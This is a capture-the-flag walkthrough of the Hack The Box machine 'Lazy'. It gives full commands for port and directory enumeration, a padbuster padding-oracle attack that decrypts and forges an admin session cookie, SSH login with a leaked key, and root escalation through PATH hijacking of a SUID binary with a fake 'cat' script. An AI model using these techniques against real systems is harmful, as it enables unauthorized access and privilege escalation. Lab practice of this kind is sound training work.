---

# Hack The Box – Lazy

# 1. Enumeration

## Nmap Scan – Full Port Discovery

```bash
nmap -p- --min-rate 1000 -T4 -oN lazy_allports.txt 10.10.10.18
```

### Results

```
22/tcp open
80/tcp open
```

Two ports were identified as open: **22 (SSH)** and **80 (HTTP)**.

---

## Nmap Scan – Service & Script Enumeration

```bash
nmap -p 22,80 -sV -sC -oN lazy_services.txt 10.10.10.18
```

### Results

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Only SSH and HTTP were exposed. The primary attack surface was the web application running on port 80.

---

# 2. Web Enumeration

## Directory Brute Forcing

```bash
gobuster dir -u http://10.10.10.18 -w /usr/share/wordlists/dirb/common.txt
```

Discovered files:

```
/index.php
/login.php
/register.php
/logout.php
/classes/
```

The application appeared to implement user authentication functionality.

---

## Session Cookie Analysis

After registering and logging in, the following cookie was issued:

```
auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO
```

The cookie:

* Remained constant length
* Appeared encrypted
* Changed per session

Initial testing did not reveal SQL injection or input validation vulnerabilities.

Focus shifted to cryptographic weaknesses.

---

# 3. Padding Oracle Attack – Cookie Decryption

Application behavior differed when ciphertext was modified, indicating a **padding oracle vulnerability**.

Using `padbuster`:

```bash
padbuster http://10.10.10.18 \
2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 \
-cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO \
-encoding 0
```

Decrypted output:

```
user=arrexel
```

This confirmed:

* Username stored client-side
* Encryption without integrity protection
* Vulnerable to chosen-ciphertext attack

---

# 4. Forging Admin Session

Since encryption was possible via the oracle, a forged cookie was generated:

```bash
padbuster http://10.10.10.18 \
2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 \
-cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO \
-encoding 0 \
-plaintext user=admin
```

After replacing the cookie:

* Additional administrative content was revealed
* A downloadable SSH private key was exposed
* The key belonged to user **mitsos**

---

# 5. Initial Access – SSH

## Prepare Key

```bash
chmod 600 id_rsa
```

## SSH Login

```bash
ssh -i id_rsa mitsos@10.10.10.18
```

User access obtained.

Retrieve user flag:

```bash
cat /home/mitsos/user.txt
```

---

# 6. Privilege Escalation

## SUID Enumeration

```bash
ls -la
```

Output:

```
-rwsrwsr-x 1 root root 7303 backup
```

The `backup` binary was SUID and executed as root.

---

## Binary Analysis

```bash
strings backup
```

Relevant output:

```
cat /etc/shadow
```

The binary invoked `cat` without specifying an absolute path.

This indicated potential **PATH hijacking**.

---

## Exploit – PATH Hijacking

### Modify PATH

```bash
export PATH=.:$PATH
```

### Create Malicious cat

```bash
nano cat
```

Contents:

```bash
#!/bin/sh
more /root/root.txt > /home/mitsos/root.txt
```

Make executable:

```bash
chmod +x cat
```

### Execute SUID Binary

```bash
./backup
```

The malicious `cat` executed with root privileges, copying the root flag.

---

## Confirm Root Flag

```bash
cat root.txt
```
---

